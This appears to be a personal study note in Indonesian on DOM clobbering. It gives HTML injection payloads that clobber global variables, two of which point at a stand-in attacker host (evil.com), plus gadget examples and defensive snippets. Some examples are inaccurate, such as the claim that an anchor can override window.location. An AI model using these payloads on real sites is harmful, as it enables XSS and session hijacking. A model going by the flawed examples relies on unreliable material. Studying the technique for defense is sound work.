---
title: "DOM Clobbering — Browser-Side Attack: HTML Injection, XSS Bypass, Defense"
tags:
  - cyber-security
  - dom-clobbering
  - xss
  - browser-security
  - library
aliases:
  - "DOM Clobbering Complete Guide"
  - "HTML ID Clobbering"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> DOM Clobbering adalah teknik di mana attacker menggunakan HTML element dengan `id` atau `name` attribute untuk "menimpa" (clobber) global JavaScript variable. Jika JavaScript mengakses `window.x` atau global `x`, dan ada element HTML dengan `id="x"`, maka nilai element tersebut yang akan direturn — bukan undefined. Ini bisa bypass sanitasi HTML dan menyebabkan XSS.

**Cross-link:** [[browser-security-exploitation-deepdive]] → [[web-hacking-exploitation]] → [[web-security]]

---

## Daftar Isi

- [[#1. Bagaimana DOM Clobbering Bekerja]]
- [[#2. Clobbering Vectors]]
- [[#3. Gadget-Based Exploitation]]
- [[#4. Defense]]

---

## 1. Bagaimana DOM Clobbering Bekerja

### Mekanisme

```html
<!-- Attacker inject: -->
<a id="username">attacker</a>

<!-- Di JavaScript: -->
<script>
  if (window.username) {
    // true! username = <a> element, bukan undefined
    showUser(window.username) // Kirim element anchor ke function
  }
</script>
```

### Hierarki Clobbering

```
form.id → window.formname
img.name → window.imagename
embed.name → window.embedname
object.id → window.objectname
a.id → window.anchor
```

---

## 2. Clobbering Vectors

### Form Clobbering

```html
<!-- Clobber window.config -->
<form id="config">
  <input name="api_key" value="HACKED" />
</form>

<!-- JavaScript: window.config.api_key → "HACKED" -->
<!-- Jika awalnya undefined, jadi terdefinisi -->
```

### Anchor Clobbering

```html
<!-- Override window.location (anchor punya .href) -->
<a id="location" href="https://evil.com/">
  <!-- JavaScript: window.location → <a> element -->
  <!-- window.location.href → "https://evil.com/" --></a
>
```

### Embed/Object Clobbering

```html
<object id="serverConfig" data="https://evil.com/config.json">
  <!-- JavaScript: window.serverConfig.data → "https://evil.com/config.json" -->
</object>
```

---

## 3. Gadget-Based Exploitation

DOM Clobbering sering dipasangkan dengan **gadget** — kode legitimate yang menggunakan variable yang bisa di-clobber.

### Google Closure Library Gadget

```javascript
// Google Closure Library mengakses window.goog
// Jika ada <a id="goog"> → clobber window.goog sebagai anchor
```

### jQuery Gadget

```javascript
// jQuery: window.jQuery = window.$
// Jika ada <a id="$"> → $ jadi element, bukan function
// → Error yang bisa diexploit
```

---

## 4. Defense

```javascript
// ✅ Safe: cek typeof sebelum akses
if (typeof window.config !== "string") {
  // Hanya string yang valid
}

// ✅ Safe: gunakan local scope
function secure() {
  let config = null // local variable, tidak ter-clobber
}

// ✅ Safe: Object.create(null)
const safeConfig = Object.create(null) // no prototype chain
```

**Referensi:** `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/DOM Clobbering/`
